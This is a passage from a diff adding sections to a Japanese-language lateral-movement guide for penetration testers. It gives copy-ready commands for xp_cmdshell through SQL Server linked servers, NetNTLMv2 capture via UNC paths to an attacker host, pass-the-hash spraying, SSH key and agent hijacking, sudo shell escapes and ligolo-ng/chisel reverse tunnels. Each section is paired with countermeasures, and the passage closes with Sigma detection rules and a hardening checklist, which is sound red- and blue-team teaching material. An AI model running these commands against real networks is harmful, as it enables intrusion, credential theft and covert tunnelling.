+EXECUTE (<span class="s">'sp_configure ''xp_cmdshell'', 1; RECONFIGURE'</span>) AT [<span class="v">&lt;LINKED&gt;</span>];
+EXECUTE (<span class="s">'xp_cmdshell ''whoami'''</span>) AT [<span class="v">&lt;LINKED&gt;</span>];
+
+<span class="c">-- 二段以上の chain (linkedA -&gt; linkedB)</span>
+SELECT * FROM OPENQUERY([<span class="v">&lt;LINKED_A&gt;</span>], <span class="s">'SELECT * FROM OPENQUERY([&lt;LINKED_B&gt;], ''SELECT SYSTEM_USER'')'</span>);</code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerUpSQL の crawl - 全 linked server chain を自動探索して sysadmin に到達するパスを提示</span>
+Get-SQLServerLinkCrawl -Instance <span class="v">&lt;TARGET&gt;</span> -Verbose
+
+<span class="c"># chain の末端で任意コマンドを実行</span>
+Get-SQLServerLinkCrawl -Instance <span class="v">&lt;TARGET&gt;</span> -Query <span class="s">"EXEC xp_cmdshell 'whoami'"</span></code></pre></div>
+
+      <h3 id="mssql-uncpath">UNC path による NetNTLMv2 収奪</h3>
+      <p>SQL Server の service account に対する NetNTLMv2 challenge/response を強制的に取得できる。Responder で待ち受けて hash を Relay に流す。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- xp_dirtree で UNC path を触らせる → SQL service account の NetNTLMv2 が Responder に届く</span>
+EXEC xp_dirtree <span class="s">'\\<span class="v">&lt;LHOST&gt;</span>\test\'</span>, 1, 1;
+
+<span class="c">-- xp_fileexist / xp_subdirs でも同じ</span>
+EXEC xp_fileexist <span class="s">'\\<span class="v">&lt;LHOST&gt;</span>\test\'</span>;</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>xp_cmdshell を default 無効</strong>のまま維持、有効化する運用が必要な場合は sysadmin ロールに絞る。<code>sp_configure</code> の変更を Extended Events で audit。</li>
+          <li><strong>SQL Server audit</strong> を有効化: <code>CREATE SERVER AUDIT SPECIFICATION</code> で <code>SCHEMA_OBJECT_ACCESS_GROUP</code> と <code>DATABASE_PRINCIPAL_CHANGE_GROUP</code> を拾う。</li>
+          <li><strong>Linked server の RPC OUT を無効</strong>: <code>EXEC sp_serveroption '&lt;linked&gt;', 'rpc out', 'false'</code>。用途がない linked server は削除。</li>
+          <li><strong>SQL Server service account を local admin から外す</strong>: Managed Service Account (gMSA) を使い、必要最小限の権限で運用。</li>
+          <li><strong>Sysmon EID 1</strong> で <code>parent=sqlservr.exe</code> かつ <code>child=cmd.exe|powershell.exe</code> の rule を貼る。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SQL Server は「credential dumping 対象ではないが shell を出せる」ため、EDR の視野の外で lateral できることが多い。</li>
+          <li>Linked server chain は BloodHound の attack path に載らない — 手動で <code>sys.servers</code> を毎 instance で確認するか、PowerUpSQL の crawl を使う。</li>
+          <li>xp_cmdshell が塞がれていても <code>sp_OACreate</code> / CLR assembly load で代替可能。CLR は sp_configure すら不要のパターンもある。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>Non-domain / Workgroup Lateral<span class="jp">非ドメイン環境の横展開</span></h2>
+      <p>AD が無い、または member でない host 群での lateral。Kerberos は使えず、NTLM 100% + UAC Remote Restriction の壁がある。DMZ / OT / legacy 環境 / M&A 直後のセグメントで頻出。</p>
+
+      <h3 id="uac-remote">UAC Remote Restriction の解説</h3>
+      <p>非-domain の Local Admin account (Administrator を除く) は既定で <strong>remote 経由でのみ token filtering される</strong>。SMB / WinRM / RPC でリモート接続すると full admin token が medium integrity に downgrade され、Admin$/C$ への write や service create が失敗する。回避には target 側 registry で <code>LocalAccountTokenFilterPolicy = 1</code> を仕込む必要がある。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># target 側で LocalAccountTokenFilterPolicy を有効化</span>
+reg add <span class="s">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+<span class="c"># 反映 (再起動不要)</span>
+<span class="c"># -&gt; 以降、Local Admin group の任意メンバが remote で full admin token を持てる</span></code></pre></div>
+      <p>ただし「そもそも仕込むには先に target で command 実行が必要」= 鶏卵問題。実務では以下の順で試す:</p>
+      <ol>
+        <li>built-in <code>Administrator</code> account の hash があるか(これだけは UAC filtering を回避)</li>
+        <li>Administrator ではない Local Admin なら、SMB での <code>ADMIN$</code> write が通るか事前確認</li>
+        <li>psexec の Named Pipe 経由 (impacket-psexec) は UAC filtering の影響を受けにくい</li>
+      </ol>
+
+      <h3 id="local-admin-hash">Local Admin hash reuse (spray)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># /24 全体に built-in Administrator の NT hash を spray (--local-auth 必須)</span>
+nxc smb <span class="v">&lt;CIDR&gt;</span> -u Administrator -H <span class="v">&lt;NT&gt;</span> --local-auth
+nxc smb <span class="v">&lt;CIDR&gt;</span> -u Administrator -H <span class="v">&lt;NT&gt;</span> --local-auth -x <span class="s">'hostname'</span>
+
+<span class="c"># PsExec 系 (--local-auth 相当は impacket-psexec なら自動判定)</span>
+impacket-psexec Administrator@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+
+<span class="c"># LAPS 環境の check (nxc の laps module)</span>
+nxc ldap <span class="v">&lt;DC&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> --laps
+nxc smb <span class="v">&lt;CIDR&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> -M laps</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>LAPS が導入されている環境では local admin password が host ごとに一意 (かつ ADSI 上の <code>ms-Mcs-AdmPwd</code> 属性に平文保存)。<strong>hash reuse は成立しない</strong>が、AD 読み取りができれば LAPS 平文を直接引ける。Windows LAPS (2023 以降) は暗号化保存に変わっているので条件が違う。</div>
+
+      <h3 id="workgroup-winrm">Workgroup 環境での WinRM</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># client (operator side): TrustedHosts に target を追加</span>
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value <span class="s">"&lt;TARGET&gt;"</span> -Force
+
+<span class="c"># 接続 (Local Admin credential)</span>
+<span class="k">$cred</span> = Get-Credential                              <span class="c"># Administrator + password</span>
+Enter-PSSession -ComputerName <span class="v">&lt;TARGET&gt;</span> -Credential <span class="k">$cred</span>
+
+<span class="c"># target 側で WinRM を有効化 (Server 版は default 有効、Client 版は要 winrm quickconfig)</span>
+<span class="c">#   -&gt; Client 版は事前に WinRM が動いていないので、SMB で先に有効化コマンドを撃つ必要あり:</span>
+<span class="c">#      nxc smb &lt;TARGET&gt; -u Administrator -H &lt;NT&gt; --local-auth -x 'winrm quickconfig -q'</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>built-in Administrator を無効化</strong>、または rename + 20 文字以上 random password + 定期変更 (LAPS 適用対象に含める)。</li>
+          <li><strong>LAPS を全 workstation / member server に適用</strong>: local admin password の site-wide reuse を根絶。</li>
+          <li><strong>UAC Remote Restriction をそのまま維持</strong>: <code>LocalAccountTokenFilterPolicy</code> を <strong>0</strong> のまま。運用で必要な場合は GPO で管理下に置き、変更を SIEM で監視。</li>
+          <li><strong>Network Level Authentication (NLA)</strong> を強制 (RDP)、SMB signing を強制。</li>
+          <li><strong>Guest / Domain Users を Local Admin から除外</strong>: workgroup 系でも Local Users / Groups を GPO / Local Group Policy で管理。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Non-domain lateral の第一問は「built-in Administrator の hash があるか」。あれば UAC Remote Restriction を素通りできる。</li>
+          <li>Administrator 以外の Local Admin は <code>LocalAccountTokenFilterPolicy=1</code> の事前仕込みが必要 → 鶏卵問題。</li>
+          <li>LAPS 未導入環境では local admin hash が全 host で共通のケースが多い。/24 spray で高確率で全落ちする。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Cross-platform Lateral<span class="jp">クロスプラットフォーム横展開</span></h2>
+      <p>Linux ↔ Windows の interoperability。Windows → Linux の lateral は SSH key reuse と agent hijack が定石、Linux → Windows は impacket が中心。両方向で「認証材料をどう transport に載せ替えるか」がポイント。</p>
+
+      <h3 id="lin-to-win">Linux → Windows</h3>
+      <p>impacket / netexec / evil-winrm が全て Linux native。<a href="#s02">s02</a>〜<a href="#s06">s06</a> の Linux 側手順を参照。</p>
+
+      <h3 id="win-to-lin">Windows → Linux (逆方向)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows 10/11 の OpenSSH client (default installed since 1809)</span>
+ssh <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+ssh -i C:\Users\<span class="v">&lt;U&gt;</span>\.ssh\id_rsa <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># plink (PuTTY 系) — password を CLI で渡せる (Windows 標準に無い環境で常用)</span>
+plink -pw <span class="v">&lt;PW&gt;</span> -batch <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> <span class="s">"whoami"</span>
+
+<span class="c"># PowerShell 7+ の SSH remoting</span>
+Enter-PSSession -HostName <span class="v">&lt;TARGET&gt;</span> -UserName <span class="v">&lt;USER&gt;</span>
+Invoke-Command -HostName <span class="v">&lt;TARGET&gt;</span> -UserName <span class="v">&lt;USER&gt;</span> -ScriptBlock { hostname; id }</code></pre></div>
+
+      <h3 id="ssh-key-reuse">SSH key reuse & agent hijack</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] 侵害済み Linux host で SSH key を探索</span>
+find / -name id_rsa -o -name id_ed25519 -o -name id_ecdsa 2&gt;/dev/null
+find / -name authorized_keys 2&gt;/dev/null
+find / -name known_hosts 2&gt;/dev/null                            <span class="c"># 過去接続先の list</span>
+
+<span class="c"># [2] passphrase 無しの秘密鍵はそのまま流用可</span>
+ssh -i /path/to/id_rsa <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;NEXT_HOST&gt;</span>
+
+<span class="c"># [3] passphrase あり → john で crack</span>
+ssh2john id_rsa &gt; id_rsa.john
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
+
+<span class="c"># [4] SSH agent socket の hijack (別ユーザが agent を動かしている環境で有効)</span>
+ls -la /tmp/ssh-*                                               <span class="c"># agent socket の一覧</span>
+<span class="k">export</span> SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.<span class="v">&lt;PID&gt;</span>
+ssh-add -l                                                       <span class="c"># hijack した agent が持つ鍵を確認</span>
+ssh <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;NEXT_HOST&gt;</span>                                    <span class="c"># agent が持つ鍵で認証</span>
+
+<span class="c"># [5] ssh -A で forward された agent は上流ホストに残る (下流の root が奪える)</span>
+<span class="c">#     -&gt; jump host の運用で ssh -A を使う組織で特に効く</span></code></pre></div>
+
+      <h3 id="sudo-abuse">sudo passwordless abuse</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] 現ユーザで NOPASSWD で許可されているコマンドを確認</span>
+sudo -l
+<span class="c">#   -&gt; (root) NOPASSWD: /usr/bin/vim, /usr/bin/find, ...</span>
+
+<span class="c"># [2] GTFOBins パターンで shell 到達 (代表例)</span>
+sudo find . -exec /bin/sh \; -quit
+sudo vim -c <span class="s">':!/bin/sh'</span>
+sudo awk <span class="s">'BEGIN {system("/bin/sh")}'</span>
+sudo less /etc/hosts   <span class="c"># less の中で !sh</span>
+
+<span class="c"># [3] SUID / SGID の hunt (persistence 前段)</span>
+find / -perm -4000 -type f 2&gt;/dev/null                          <span class="c"># SUID</span>
+find / -perm -2000 -type f 2&gt;/dev/null                          <span class="c"># SGID</span></code></pre></div>
+
+      <h3 id="wsl-cross">WSL 経由の cross-boundary</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># WSL がインストールされているか確認</span>
+wsl --list --verbose
+Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
+
+<span class="c"># WSL 内から Linux 側の tool を使う (Windows host の資産にアクセス可能)</span>
+wsl -e ip a
+wsl -e cat /mnt/c/Users/<span class="v">&lt;USER&gt;</span>/.ssh/id_rsa                   <span class="c"># Windows 側の SSH key を WSL 経由で読む</span>
+
+<span class="c"># WSL2 は VM ベースで独自 IP (172.x.x.x)。routing は Windows host が bridge</span>
+wsl -e ss -tln                                                    <span class="c"># WSL 内 listener</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>SSH key 管理</strong>: 秘密鍵に passphrase を必ず設定、agent forwarding (<code>ssh -A</code>) は jump host 運用のみで許可 (<code>ForwardAgent yes</code> の GPO 管理)。</li>
+          <li><strong>authorized_keys の監視</strong>: <code>auditd</code> で <code>~/.ssh/authorized_keys</code> の write を wa audit ルールに登録。新規 pubkey 追加を SIEM に転送。</li>
+          <li><strong>sudo policy の最小化</strong>: NOPASSWD を極力使わず、必要な場合は GTFOBins に載っている binary (<code>find</code>, <code>vim</code>, <code>less</code>, <code>awk</code>, <code>tar</code>, etc.) を対象から除外。</li>
+          <li><strong>WSL の有効化 policy</strong>: 業務端末では <code>Microsoft-Windows-Subsystem-Linux</code> と <code>VirtualMachinePlatform</code> の Optional Feature を GPO で無効化。</li>
+          <li><strong>OpenSSH server logs</strong>: <code>/var/log/auth.log</code> の <code>Accepted publickey</code> に対して new source IP を alert。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SSH key reuse は Linux 環境の lateral で最も高頻度・低検知の pattern。過去接続履歴 (<code>known_hosts</code>) と <code>authorized_keys</code> の cross-check で lateral graph が浮かぶ。</li>
+          <li>SSH agent hijack は root さえ取れれば認証情報ゼロで next-hop に到達可能。jump host 運用組織で最優先。</li>
+          <li>WSL は「Windows 上で Linux が動く」ため EDR の視野が二層に分かれる。Windows 側の EDR が WSL 内のプロセスを完全に見えていない環境がある。</li>
+          <li>Windows → Linux の逆方向 lateral は OpenSSH client の存在確認から。1809 以降のほぼ全 Windows で <code>ssh.exe</code> が使える。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Pivot Topology &amp; Fallback Ladder<span class="jp">経路設計とフォールバック</span></h2>
+      <p>chisel / ligolo-ng の個別コマンドは <a href="tooling.html">tooling</a> が本文。ここでは<strong>どの topology を選ぶか</strong>の判断フレームワークと egress 制限下の fallback ladder に絞る。</p>
+
+      <h3 id="topology-matrix">Topology 判断マトリクス</h3>
+      <table>
+        <thead><tr><th>手段</th><th>protocol</th><th>UDP</th><th>raw socket / ICMP</th><th>帯域</th><th>検知</th><th>典型シナリオ</th></tr></thead>
+        <tbody>
+          <tr><td>SOCKS (chisel / ssh -D)</td><td>TCP のみ</td><td>✗</td><td>✗</td><td>中</td><td>低</td><td>普通の service 探索</td></tr>
+          <tr><td>TUN (ligolo-ng)</td><td>全</td><td>✓</td><td>✓</td><td>高</td><td>中 (device 作成)</td><td>nmap SYN scan / UDP / VPN と同等の到達性</td></tr>
+          <tr><td>port-forward (ssh -L / chisel remote)</td><td>1 service</td><td>N/A</td><td>N/A</td><td>高</td><td>低</td><td>単一 service (RDP / DB) を確実に</td></tr>
+          <tr><td>ProxyJump (ssh -J)</td><td>TCP のみ</td><td>✗</td><td>✗</td><td>中</td><td>低 (SSH に紛れる)</td><td>multi-hop、既存 SSH 経路の活用</td></tr>
+          <tr><td>double pivot</td><td>手段依存</td><td>手段依存</td><td>手段依存</td><td>低</td><td>低</td><td>2 段以上の segmented network</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="ligolo-topology">ligolo-ng の topology 特性</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator] proxy 起動 (TLS listener)</span>
+sudo ip tuntap add user <span class="v">&lt;USER&gt;</span> mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert                                <span class="c"># self-signed で listen (11601/tcp)</span>
+
+<span class="c"># [pivot 側] agent を起動 → proxy へ connect back</span>
+./agent -connect <span class="v">&lt;LHOST&gt;</span>:11601 -ignore-cert
+
+<span class="c"># [operator の proxy CLI] session を選択</span>
+ligolo-ng » session
+<span class="c">#   -&gt; 1 番を選択</span>
+
+<span class="c"># [operator] interface 作成 + route 追加</span>
+ligolo-ng » interface_create --name ligolo
+ligolo-ng » interface_list
+
+<span class="c"># pivot 越しに到達したい CIDR を route table に足す</span>
+sudo ip route add <span class="v">&lt;TARGET_CIDR&gt;</span> dev ligolo
+
+<span class="c"># -&gt; 以降 kali の tool は全て pivot 側の routing で target に到達する</span>
+<span class="c">#    (nmap -sS, evil-winrm, impacket-*, msf 全て proxychains 不要で通る)</span>
+
+<span class="c"># reverse listener (target -&gt; kali:8888 を作りたい場合)</span>
+ligolo-ng » listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:9999
+<span class="c">#   -&gt; pivot host の 8888 に来た connection が kali の 9999 に forward される</span></code></pre></div>
+
+      <h3 id="double-pivot">Double pivot (segment 越え)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># segment A (10.10.0.0/24) &lt;-&gt; segment B (172.16.5.0/24) が pivot1 経由で繋がる</span>
+<span class="c"># segment B の中の pivot2 経由で segment C (192.168.20.0/24) に到達したい</span>
+
+<span class="c"># [operator (kali)]:</span>
+sudo ip route add 10.10.0.0/24 dev ligolo    <span class="c"># pivot1 で入る A → B</span>
+
+<span class="c"># pivot1 上で agent → operator の chain を確立</span>
+
+<span class="c"># [pivot2 側] agent を pivot1 の中継経由 or operator に直接 connect back</span>
+<span class="c"># operator 側で pivot2 の session が別 tab に来る</span>
+ligolo-ng » session
+<span class="c">#   -&gt; 2 番 (pivot2) を選択</span>
+ligolo-ng » interface_create --name ligolo2
+sudo ip route add 192.168.20.0/24 dev ligolo2
+
+<span class="c"># -&gt; A から C までの全 CIDR が operator 側 routing table に統合される</span></code></pre></div>
+
+      <h3 id="chisel-socks">chisel SOCKS (HTTPS 制約下)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator] server</span>
+./chisel server -p 8443 --reverse --tls-cert cert.pem --tls-key key.pem
+
+<span class="c"># [pivot] client → operator に reverse tunnel + SOCKS5 (R:1080)</span>
+./chisel client --tls-skip-verify https://<span class="v">&lt;LHOST&gt;</span>:8443 R:1080:socks
+
+<span class="c"># [operator] proxychains 経由で kali tool を通す</span>
+echo <span class="s">"socks5 127.0.0.1 1080"</span> &gt;&gt; /etc/proxychains4.conf
+proxychains4 nmap -sT -Pn -p 80,443,445 <span class="v">&lt;TARGET&gt;</span>
+proxychains4 impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span></code></pre></div>
+
+      <h3 id="egress-ladder">Egress fallback ladder</h3>
+      <p>corporate proxy / firewall の制限度合いに応じて、以下の順で試す:</p>
+      <ol>
+        <li><strong>TCP any-port</strong> — 制限ゆるい環境。chisel plain / ssh。</li>
+        <li><strong>HTTPS 443</strong> — chisel over TLS。SNI と Host header を合わせて自然な CDN-like traffic に見せる。</li>
+        <li><strong>HTTP CONNECT via corporate proxy</strong> — chisel の <code>--proxy http://user:pass@proxy:port</code>。auth 済みの proxy を通す。</li>
+        <li><strong>DNS tunneling</strong> — dnscat2 / iodine。帯域は狭いが internal DNS しか解決しない環境でも通る場合が多い。</li>
+        <li><strong>ICMP tunneling</strong> — icmpsh / ptunnel。最終手段、帯域極小。</li>
+      </ol>
+
+      <h3 id="ssh-proxyjump">SSH ProxyJump (multi-hop)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] 単純な 2-hop</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># [2] 3-hop 以上</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span>,<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP2&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># [3] SSH config で恒久化 (~/.ssh/config)</span>
+<span class="c">#   Host target</span>
+<span class="c">#     HostName &lt;TARGET&gt;</span>
+<span class="c">#     User &lt;USER&gt;</span>
+<span class="c">#     ProxyJump hop1,hop2</span>
+
+<span class="c"># [4] SOCKS5 を確保しつつ ProxyJump (混合 pattern)</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> -D 1080 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>egress filter</strong>: 業務用 network から任意 IP:port への outbound を白リスト方式に制限。443 も corporate proxy 経由のみに絞る (SNI と Host header の整合を検査するプロキシ)。</li>
+          <li><strong>TUN device の作成監視</strong>: <code>auditd</code> で <code>execve</code> の <code>ip tuntap add</code> / <code>ip link add</code> を wa 監視、Windows 側は <code>Sysmon EID 22</code> (DNS query) と併せて anomaly 検知。</li>
+          <li><strong>DNS anomaly detection</strong>: 単一 host からの高頻度 TXT / A record query、subdomain 長の異常、通信量 anomaly (通常 domain より遥かに多い名前解決)。</li>
+          <li><strong>SSH client 挙動監視</strong>: sshd 側の <code>ForwardAgent / GatewayPorts / AllowTcpForwarding</code> を全て <code>no</code> に設定、jump host のみ例外運用。</li>
+          <li><strong>ICMP payload inspection</strong>: 平均 payload size と rate の anomaly 検知。ICMP tunnel は payload が大きくなる。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>ligolo-ng の TUN は「pivot 越しの nmap SYN scan / UDP / raw socket」が可能な唯一の topology。scan の再現性を担保したい engagement で第一選択。</li>
+          <li>chisel SOCKS は「TCP のみで軽く済ませたい」場合の default、HTTPS 制約下の egress では必須。</li>
+          <li>Egress ladder は上から下ほど帯域と検知回避の trade-off が悪化する。まず TCP any-port を試し、塞がれてから 443 → DNS → ICMP と落ちていく。</li>
+          <li>Double pivot は<strong>各 hop での TUN interface 名を分けて</strong> routing table に別々に足す。同名で足すと後段が前段を上書きする。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s11" class="reveal">
+      <h2><span class="num">11</span>Detection &amp; Hardening<span class="jp">検知と防御の統合</span></h2>
+      <p>各 section 末尾の Detection を統合し、blue team が lateral の signature を最短で捉えるための telemetry 設計に落とし込む。</p>
+
+      <h3 id="telemetry">最小 telemetry セット</h3>
+      <table>
+        <thead><tr><th>層</th><th>event</th><th>signal</th></tr></thead>
+        <tbody>
+          <tr><td>DC</td><td>EID 4624 type 3 / 10</td><td>認証頻度と source workstation の異常</td></tr>
+          <tr><td>DC</td><td>EID 4648</td><td>explicit credential logon (createnetonly / runas /netonly の trace)</td></tr>
+          <tr><td>DC</td><td>EID 4672</td><td>特権 privilege 付与 (SYSTEM 相当への昇格)</td></tr>
+          <tr><td>DC</td><td>EID 4769</td><td>Kerberos TGS request の SPN と source anomaly</td></tr>
+          <tr><td>host</td><td>EID 7045</td><td>new service install (impacket-psexec signature)</td></tr>
+          <tr><td>host</td><td>EID 4698</td><td>scheduled task created (atexec signature)</td></tr>
+          <tr><td>host</td><td>EID 5145</td><td>detailed file share access (ADMIN$/C$)</td></tr>
+          <tr><td>host</td><td>Sysmon EID 1</td><td>parent-child anomaly (services.exe/wmiprvse.exe/mmc.exe/dllhost.exe/wsmprovhost.exe/sqlservr.exe → cmd/powershell)</td></tr>
+          <tr><td>host</td><td>Sysmon EID 3</td><td>非通常 outbound (445 intra-subnet / 5985-6 outbound)</td></tr>
+          <tr><td>border</td><td>flow / netflow</td><td>TUN device host からの unusual routing、SNI/Host mismatch、DNS anomaly</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="sigma-rules">代表 Sigma-style rules</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">yaml</span><button class="copy">copy</button></div><pre><code><span class="c"># Impacket-style service creation (EID 7045)</span>
+title: Impacket PSExec Service Install
+logsource:
+  product: windows
+  service: system
+detection:
+  selection:
+    EventID: 7045
+    ServiceName|re: <span class="s">'^[a-zA-Z]{8}$'</span>              <span class="c"># 8 char random</span>
+    ImagePath|contains: <span class="s">'cmd.exe /c'</span>
+  condition: selection
+level: high</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">yaml</span><button class="copy">copy</button></div><pre><code><span class="c"># WMI-based execution (Sysmon EID 1)</span>
+title: Suspicious WMI Process Create
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 1
+    ParentImage|endswith: <span class="s">'\wmiprvse.exe'</span>
+    Image|endswith:
+      - <span class="s">'\cmd.exe'</span>
+      - <span class="s">'\powershell.exe'</span>
+      - <span class="s">'\pwsh.exe'</span>
+  condition: selection
+level: high</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">yaml</span><button class="copy">copy</button></div><pre><code><span class="c"># DCOM MMC20 abuse (Sysmon EID 1)</span>
+title: DCOM MMC20 Lateral Movement
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 1
+    ParentImage|endswith: <span class="s">'\mmc.exe'</span>
+    Image|endswith:
+      - <span class="s">'\cmd.exe'</span>
+      - <span class="s">'\powershell.exe'</span>
+    ParentCommandLine|contains: <span class="s">'-Embedding'</span>
+  condition: selection
+level: high</code></pre></div>
+
+      <h3 id="hardening-checklist">Hardening checklist</h3>
+      <ul>
+        <li><strong>SMB signing required</strong> (全 member、GPO 強制)</li>
+        <li><strong>EPA</strong> (Enhanced Protection for Authentication) を LDAPS / HTTPS で有効化 → NTLM Relay 完封</li>
+        <li><strong>WinRM を Kerberos-only 化</strong> (Auth NTLM=false)</li>
+        <li><strong>Restricted Admin を default 無効</strong>、jump host 用途のみ enable + audit</li>
+        <li><strong>Protected Users group</strong> に DA / high-value account を必ず投入 (RC4 無効 + delegation 対象外)</li>
+        <li><strong>LAPS 全展開</strong> — Local Admin password の site-wide reuse を根絶</li>
+        <li><strong>LocalAccountTokenFilterPolicy = 0</strong> を workgroup / 非-domain segment で維持</li>
+        <li><strong>PowerShell Script Block Logging</strong> (EID 4104) を GPO で強制</li>
+        <li><strong>Sysmon 導入</strong> + SwiftOnSecurity config or Olaf Hartong config で parent-child 検査</li>
+        <li><strong>egress 白リスト化</strong> + corporate proxy 経由必須 (443 直接 outbound 禁止)</li>
+        <li><strong>Windows Defender Application Control (WDAC)</strong> or AppLocker で任意 binary 実行を制限 — service create 系の binary drop を封じる</li>
+      </ul>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Lateral の signature は「認証 event (DC 側 4624/4648/4769)」と「実行 event (host 側 7045/Sysmon EID 1 parent-child)」の pair で捉える。片方だけでは false-positive が多い。</li>
+          <li>SMB signing + WinRM Kerberos-only + Protected Users + LAPS の 4 点セットで lateral の primitive 大部分が塞がる。</li>
+          <li>Sysmon の parent-child 検査は攻撃側の <a href="#s03">s03</a> DCOM object 選択と直結する。Sysmon config を熟読するだけで、blue team に嫌がられる DCOM object の選択肢が絞れる。</li>
         </ul>
       </div>
     </section>
 
     <section id="ref" class="reveal">
-      <h2><span class="num">05</span>参照<span class="jp">References</span></h2>
+      <h2><span class="num">12</span>References<span class="jp">参照</span></h2>
       <ul>
+        <li>MITRE ATT&amp;CK T1021 (Remote Services) — <a href="https://attack.mitre.org/techniques/T1021/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1021</a></li>
+        <li>MITRE ATT&amp;CK T1210 (Exploitation of Remote Services) — <a href="https://attack.mitre.org/techniques/T1210/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1210</a></li>
+        <li>MITRE ATT&amp;CK T1570 (Lateral Tool Transfer) — <a href="https://attack.mitre.org/techniques/T1570/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1570</a></li>
+        <li>MITRE ATT&amp;CK T1550 (Use Alternate Authentication Material — PTH/PTT/OverPTH) — <a href="https://attack.mitre.org/techniques/T1550/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1550</a></li>
+        <li>impacket — <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">github.com/fortra/impacket</a></li>
+        <li>NetExec — <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">github.com/Pennyw0rth/NetExec</a></li>
